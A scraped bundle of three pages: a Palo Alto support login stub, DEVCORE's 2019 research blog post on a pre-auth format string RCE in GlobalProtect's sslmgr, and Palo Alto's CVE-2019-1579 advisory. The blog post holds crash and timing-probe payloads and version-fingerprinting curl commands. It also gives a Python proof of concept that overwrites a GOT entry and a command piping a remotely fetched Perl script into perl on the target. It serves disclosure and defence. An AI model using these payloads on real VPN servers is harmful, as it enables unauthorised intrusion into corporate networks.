=== Content from support.paloaltonetworks.com_1b49f74e_20250121_030849.html ===

[![](https://marketplace-images-pan.s3.us-west-2.amazonaws.com/orangBlackLogo.png)](https://www.paloaltonetworks.com/)

![](https://marketplace-images-pan.s3.us-west-2.amazonaws.com/orange-backdrop-new3.png)

## Cookies are required

Cookies are disabled on your browser. Please enable Cookies and refresh this page.

[Refresh](.)

![Palo Alto Networks](https://sso.paloaltonetworks.com/fs/bco/1/fs08ykaqtm4jZfxqB0j6)

## The page has timed out

If this page does not reload automatically, please refresh your browser.

By signing in, you agree to our
[Terms](https://www.paloaltonetworks.com/legal-notices/terms-of-use)
and acknowledge our
[Privacy Statement](https://www.paloaltonetworks.com/legal-notices/privacy).

[![](https://marketplace-images-pan.s3.us-west-2.amazonaws.com/orangBlackLogo.png)](https://www.paloaltonetworks.com/)

### Company

* [About Palo Alto Networks](https://www.paloaltonetworks.com/company)
* [Careers](https://www.paloaltonetworks.com/company/careers)

### Legal Notices

* [Privacy](https://www.paloaltonetworks.com/legal-notices/privacy)
* [Terms of Use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)

### Resources

* [Support](https://live.paloaltonetworks.com/t5/custom/page/page-id/Support)
* [Live Community](https://live.paloaltonetworks.com/)
* [Email Subscription](https://www.paloaltonetworks.com/company/subscriptions)
* [Beacon](https://beacon.exceedlms.com/student/catalog)

* [path fill-rule="evenodd" clip-rule="evenodd" d="M27.7 27.4c0 .883-.674 1.6-1.505 1.6H1.938c-.83 0-1.504-.717-1.504-1.6V1.6c0-.884.673-1.6 1.504-1.6h24.257c.83 0 1.505.716 1.505 1.6v25.8zm-8.453-9.63V29h-4.25V17.77h-3.553v-4.377h3.554v-3.228c0-3.745 2.15-5.785 5.292-5.785 1.505 0 2.799.12 3.175.172v3.915h-2.179c-1.708 0-2.039.864-2.039 2.132v2.794h4.075l-.53 4.377h-3.545z"/>](https://www.linkedin.com/company/palo-alto-networks)

© Palo Alto Networks, Inc. All rights reserved.



=== Content from devco.re_5a80dcba_20250121_005925.html ===


[![](/images/logo.svg)](/en/)

* Services
  [## Red Team Assessment

  Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.](/en/services/red-team/)
  [## Penetration Testing

  Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.](/en/services/penetration-test/)
  [## Security Consulting

  Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.](/en/services/security-consulting/)
  [## Security Training

  Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.](/en/services/security-training/)
* Research
  [## Overview

  Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.](/en/research/overview/)
  [## Competitions and Awards

  Awards from international cybersecurity competitions.](/en/research/awards/)
  [## Enterprise Vulnerability Reports

  Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.](/en/research/bug-bounty/)
  [## International Conferences

  Sharing vulnerability research and security knowledge at international cybersecurity conferences.](/en/research/talks/)
  [## CVE List

  Discovery of critical vulnerabilities in leading international products and services.](/en/research/cve/)
* Company
  [## Company Overview

  Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment, Penetration Testing, Security Consulting, and Security Training.](/en/company/about/)
  [## Team Members

  Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.](/en/company/our-team/)
  [## Achievements

  DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.](/en/company/history/)
  [## Corporate Social Responsibility

  We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.](/en/company/csr/)
  [## Job Opportunities

  Join us to secure the world and improve the cybersecurity industry together.](/en/company/jobs/)
* News
  [## BLOG

  Latest news](/en/blog/)
  [## Media Resources

  Media Kit, Logo and Usage Guideline](/en/media-kit/)
* [Search](/en/search/)
* [Contact](/en/contact/)

* Services
  [## Red Team Assessment](/en/services/red-team/)
  [## Penetration Testing](/en/services/penetration-test/)
  [## Security Consulting](/en/services/security-consulting/)
  [## Security Training](/en/services/security-training/)
* Research
  [## Overview](/en/research/overview/)
  [## Competitions and Awards](/en/research/awards/)
  [## Enterprise Vulnerability Reports](/en/research/bug-bounty/)
  [## International Conferences](/en/research/talks/)
  [## CVE List](/en/research/cve/)
* Company
  [## Company Overview](/en/company/about/)
  [## Team Members](/en/company/our-team/)
  [## Achievements](/en/company/history/)
  [## Corporate Social Responsibility](/en/company/csr/)
  [## Job Opportunities](/en/company/jobs/)
* News
  [## BLOG](/en/blog/)
  [## Media Resources](/en/media-kit/)
* [## Search](/en/search/)
  [## Contact](/en/contact/)
* Language
  [## 中文](/)
  [## English](/en)

# BLOG

* [All Articles](/en/blog/)
* [Tech Editorials](/en/blog/category/Tech%20Editorials/)
* [Media Resources](/en/media-kit/)

[Tech Editorials](/en/blog/category/Tech%20Editorials)
[#Advisory](/en/blog/tag/Advisory/) [#VPN](/en/blog/tag/VPN/) [#RCE](/en/blog/tag/RCE/) [#BugBounty](/en/blog/tag/BugBounty/)
# Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!

[Orange Tsai](/en/blog/author/orange)
2019-07-17

![](https://devco.re/assets/img/blog/20190717/cover.png)

---

Author: Orange Tsai([@orange\_8361](https://twitter.com/orange_8361)) and Meh Chang([@mehqq\_](https://twitter.com/mehqq_))

SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.

We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our [Black Hat USA](https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545) and [DEFCON](https://www.defcon.org/html/defcon-27/dc-27-speakers.html) talk:

* **Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs**!

Don’t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.

In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)

## The story

In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to `/global-protect/login.esp` on web root!

About the vulnerability, we accidentally discovered it during our [Red Team assessment services](https://devco.re/en/services/red-team/). At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.

We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!

*[1] There are some exploit about the Pan-OS management interface before such as the [CVE-2017-15944](https://www.exploit-db.com/exploits/43342) and the excellent [Troppers16 paper](https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/) by [@\_fel1x](https://twitter.com/_fel1x), but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port*

## The bug

The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The `sslmgr` is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path `/sslmgr`.

```
$ curl https://global-protect/sslmgr
<?xml version="1.0" encoding="UTF-8" ?>
        <clientcert-response>
                <status>error</status>
                <msg>Invalid parameters</msg>
        </clientcert-response>

```

During the parameter extraction, the daemon searches the string `scep-profile-name` and pass its value as the `snprintf` format to fill in the buffer. That leads to the format string attack. You can just crash the service with `%n`!

```
POST /sslmgr HTTP/1.1
Host: global-protect
Content-Length: 36

scep-profile-name=%n%n%n%n%n...

```
## Affect versions

According to our survey, all the GlobalProtect before `July 2018` are vulnerable! Here is the affect version list:

* Palo Alto GlobalProtect SSL VPN 7.1.x < 7.1.19
* Palo Alto GlobalProtect SSL VPN 8.0.x < 8.0.12
* Palo Alto GlobalProtect SSL VPN 8.1.x < 8.1.3

The series 9.x and 7.0.x are not affected by this vulnerability.

## How to verify the bug

Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can’t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!

By reading the [snprintf manual](https://linux.die.net/man/3/snprintf), we choose the `%c` as our gadget! When there is a number before the format, such as `%9999999c`, the `snprintf` repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!

```
$ time curl -s -d 'scep-profile-name=%9999999c' https://global-protect/sslmgr >/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
$ time curl -s -d 'scep-profile-name=%99999999c' https://global-protect/sslmgr >/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
$ time curl -s -d 'scep-profile-name=%999999999c' https://global-protect/sslmgr >/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s

```

As you can see, the response time increases along with the number of `%c`. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!

*[1] Although there is a watchdog monitoring the `sslmgr` daemon, it’s still improper to crash a service!*

## The exploitation

Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the `/global-protect/portal/css/login.css` from 8.x version and the `/images/logo_pan_158.gif` from 7.x version!

```
$ curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT

```

With a specified version, we can write our own exploit now. We simply modified the pointer of `strlen` on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of `system`. Here is the PoC:

```
#!/usr/bin/python

import requests
from pwn import *

url = "https://sslvpn/sslmgr"
cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt"

strlen_GOT = 0x667788 # change me
system_plt = 0x445566 # change me

fmt =  '%70$n'
fmt += '%' + str((system_plt>>16)&0xff) + 'c'
fmt += '%32$hn'
fmt += '%' + str((system_plt&0xffff)-((system_plt>>16)&0xff)) + 'c'
fmt += '%24$hn'
for i in range(40,60):
    fmt += '%'+str(i)+'$p'

data = "scep-profile-name="
data += p32(strlen_GOT)[:-1]
data += "&appauthcookie="
data += p32(strlen_GOT+2)[:-1]
data += "&host-id="
data += p32(strlen_GOT+4)[:-1]
data += "&user-email="
data += fmt
data += "&appauthcookie="
data += cmd
r = requests.post(url, data=data)

```

Once the modification is done, the `sslmgr` becomes our webshell and we can execute commands via:

```
$ curl -d 'scep-profile-name=curl orange.tw/bc.pl | perl -' https://global-protect/sslmgr

```

We have reported this bug to Palo Alto via the [report form](https://securityadvisories.paloaltonetworks.com/Report). However, we got the following reply:

> Hello Orange,
>
> Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.
>
> Kind regards

Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!

## The case study

After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take `vpn.awscorp.uberinternal.com` as an example!

From the domain name, we guess Uber uses the BYOL from [AWS Marketplace](https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&sr=0-1&ref_=srh_res_product_title). From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:

* 8.0.3
* 8.0.6
* 8.0.8
* 8.0.9
* 8.1.0

Finally, we figured out the version, it’s 8.0.6 and we got the shell back!

![](/assets/img/blog/20190717/1.png)

Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:

> Hey @orange — we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.
>
> Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!

It’s a fair decision. It’s always a great time communicating with Uber and report to their [bug bounty program](https://hackerone.com/uber). We don’t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!

[### Orange Tsai](/en/blog/author/orange)
Principal Security Researcher

I am Orange : )

[![](/images/logo.svg)](/en/)

###### Services

* [Red Team Assessment](/en/services/red-team/)
* [Penetration Testing](/en/services/penetration-test/)
* [Security Consulting](/en/services/security-consulting/)
* [Security Training](/en/services/security-training/)

###### Research

* [Overview](/en/research/overview/)
* [Competitions and Awards](/en/research/awards/)
* [Enterprise Vulnerability Reports](/en/research/bug-bounty/)
* [International Conferences](/en/research/talks/)
* [CVE List](/en/research/cve/)

###### Company

* [Company Overview](/en/company/about/)
* [Team Members](/en/company/our-team/)
* [Achievements](/en/company/history/)
* [Corporate Social Responsibility](/en/company/csr/)
* [Job Opportunities](/en/company/jobs/)
* [Contact](/en/contact/)

###### News

* [Blog](/en/blog/)
* [Media Resources](/en/media-kit/)

© 2025 DEVCORE **All rights reserved.**
[Privacy Policy](/en/privacy-policy/)

Language :[中文](/)|[English](/en/)



=== Content from security.paloaltonetworks.com_6fbd1553_20250121_005927.html ===


* [Get support](https://support.paloaltonetworks.com/support)
* [Security advisories](/)
* [Report vulnerabilities](/report)
* [Bug Bounty](/scope)
* [Subscribe](https://support.paloaltonetworks.com/SupportAccount/Preferences)
* [RSS feed](/rss.xml)
[Palo Alto Networks Security Advisories](/) /
CVE-2019-1579
## CVE-2019-1579 Remote Code Execution in GlobalProtect Portal/Gateway Interface

047910
[Severity
8.1 ·
HIGH](https://cvssjs.github.io/#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H "CVSS-B: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H")Attack Vector
**NETWORK**Scope
**UNCHANGED**Attack Complexity
**HIGH**Confidentiality Impact
**HIGH**Privileges Required
**NONE**Integrity Impact
**HIGH**User Interaction
**NONE**Availability Impact
**HIGH**[CVE](https://www.cve.org/CVERecord?id=CVE-2019-1579 "See CVE.org record")
[JSON](/json/CVE-2019-1579 "Download the information in this advisory in CVE-JSON format")
[CSAF](/csaf/CVE-2019-1579 "Download the information in this advisory in CSAF format")

 Published
**2019-07-18** Updated
**2019-07-18**Reference
**PAN-100913,
PAN-SA-2019-0020**Discovered
**internally**
### Description

Palo Alto Networks is aware of the reported remote code execution (RCE) vulnerability in its GlobalProtect portal and GlobalProtect Gateway interface products. The issue is already addressed in prior maintenance releases. (Ref: CVE-2019-1579)

Successful exploitation of this issue allows an unauthenticated attacker to execute arbitrary code.

This issue affects PAN-OS 7.1.18 and earlier, PAN-OS 8.0.11-h1 and earlier, and PAN-OS 8.1.2 and earlier releases. PAN-OS 9.0 is not affected.

### Product Status

| Versions | Affected | Unaffected |
| PAN-OS 8.1 | <= 8.1.2 | >= 8.1.3 |
| PAN-OS 8.0 | <= 8.0.11-h1 | >= 8.0.12 |
| PAN-OS 7.1 | <= 7.1.18 | >= 7.1.19 |

### Severity: HIGH

CVSSv3.1
Base Score:
8.1 ([CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H](https://cvssjs.github.io/#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H))

### Weakness Type

[CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20 "More at https://cwe.mitre.org/data/definitions/20")

### Solution

PAN-OS 7.1.19 and later, PAN-OS 8.0.12 and later, and PAN-OS 8.1.3 and later releases.

### Workarounds and Mitigations

If you have not already upgraded to the available updates listed above and cannot do so now, we recommend that you update to content release 8173, or the latest version, and confirm threat prevention is enabled and enforced on traffic that passes through the GlobalProtect portal and GlobalProtect Gateway interface.

Please see the customer advisory for more details here: <https://live.paloaltonetworks.com/t5/Customer-Advisories/Action-Recommended-Recent-Security-Advisory-PAN-SA-2019-0020-Ref/ta-p/278505> .

You are not affected if you do not have GlobalProtect enabled.

[Terms of use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)[Privacy](https://www.paloaltonetworks.com/legal-notices/privacy)[Product Security Assurance and Vulnerability Disclosure Policy](https://paloaltonetworks.com/product-security-assurance)[Report vulnerabilities](/report)[Manage subscriptions](https://support.paloaltonetworks.com/SupportAccount/Preferences)© 2025 Palo Alto Networks, Inc. All rights reserved.
